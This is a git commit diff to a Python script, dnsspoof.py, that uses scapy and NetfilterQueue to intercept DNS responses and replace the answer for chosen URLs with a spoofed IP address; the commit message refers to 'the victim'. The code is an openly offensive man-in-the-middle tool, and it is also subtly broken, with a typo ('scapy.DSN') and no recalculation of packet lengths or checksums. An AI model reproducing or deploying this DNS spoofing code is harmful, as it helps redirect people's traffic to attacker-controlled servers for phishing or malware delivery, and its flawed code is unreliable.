129041a5d30ca000379aa1917b401f12e50d3977
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-08-24 03:27:57 -0400

    Modified the ip response to the victim

--- dnsspoof.py
+++ dnsspoof.py
@@ -4,9 +4,16 @@ import scapy.all as scapy
 
 def see_packet(packet):
     use_packet = scapy.IP(packet.get_payload())
-    print(use_packet.show())
+    if use_packet.haslayer(scapy.DNSRR):
+        request_url = use_packet[scapy.DNSQR].qname
+        for url in urls:
+            if url in request_url:
+                response = scapy.DNSRR(rrname= request_url, rdata= spoof_ip)
+                use_packet[scapy.DSN].an = response
+
+                packet.set_payload(str(use_packet))
     packet.accept()
 
 queue = netq.NetfilterQueue()
-queue.bind(0,see_packet)
+queue.bind(0, see_packet)
 queue.run()
